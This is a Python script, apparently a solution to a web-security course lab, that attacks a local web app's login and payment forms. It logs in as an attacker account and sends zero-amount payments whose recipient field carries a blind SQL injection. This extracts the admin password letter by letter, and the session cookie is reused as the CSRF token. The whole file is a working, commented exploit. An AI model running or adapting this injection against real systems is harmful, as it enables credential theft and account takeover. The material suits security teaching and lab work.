from requests import codes, Session
import string

LOGIN_FORM_URL = "http://localhost:8080/login"
PAY_FORM_URL = "http://localhost:8080/pay"

def submit_login_form(sess, username, password):
    response = sess.post(LOGIN_FORM_URL,
                         data={
                             "username": username,
                             "password": password,
                             "login": "Login",
                         })
    return response.status_code == codes.ok

def submit_pay_form(sess, recipient, amount):
    response = sess.post(PAY_FORM_URL,
                    data={
                        "recipient": recipient,
                        "amount": amount,
                        #added the following line of code to ensure that the
                        #pay action would be able to check that the cookies/
                        #tokens matched and wouldn't throw an error
                        "CSRF": "session=" + str(dict(sess.cookies)['session']),
                    })

    return response.status_code == codes.ok

#wrote the sqli_attack function so that it builds up the password through
#SQL injection attacks
def sqli_attack(username):
    sess = Session()
    assert(submit_login_form(sess, "attacker", "attacker"))

    #array of all possible lowercase letters
    letters = list(string.ascii_lowercase)

    i = 0
    password = ''
    password_w_wild = ''

    #go through all the letters. Whenever a letter is found, i is reset to 0
    #so that the loop repeats. If the while loop ends, it means that no letter
    #was found and the word is complete
    while (i < len(letters)):
        letter = letters[i]
        #this line of code will be used as the SQL injection. Essentially, we
        #are appending an attack to the end of the username. To start, we
        #iterate through each letter in our attack. When we find what the first
        #letter is (the LIKE part will only hold true if our password starts
        #with the series of letters that follow), we then begin to iterate
        #through the letters for the second slot and check if the password
        #begins with the first letter plus the second letter of each iteration,
        #and so on
        name = username + "'" + ' AND users.password LIKE '+ "'" + password_w_wild + letter + '%'
        #running submit_pay_form with our SQL attack as name and with a value
        #of 0 so that no money is actually transferred. found returns true
        #if our current guess is accurate
        found = submit_pay_form(sess, name, 0)
        if found == True:
            #keeps track of building up our password
            password = password + letters[i]
            #builds up our password letters with wildcards so that we can
            #keep updating our SQL attack to check for letters at the correct
            #slot
            password_w_wild = password_w_wild + '_'
            #reset i so that we iterate through all letters in the next
            #possible slot of the word
            i = 0
        else:
            i += 1
    return password

def main():
    print(sqli_attack("admin"))

if __name__ == "__main__":
    main()
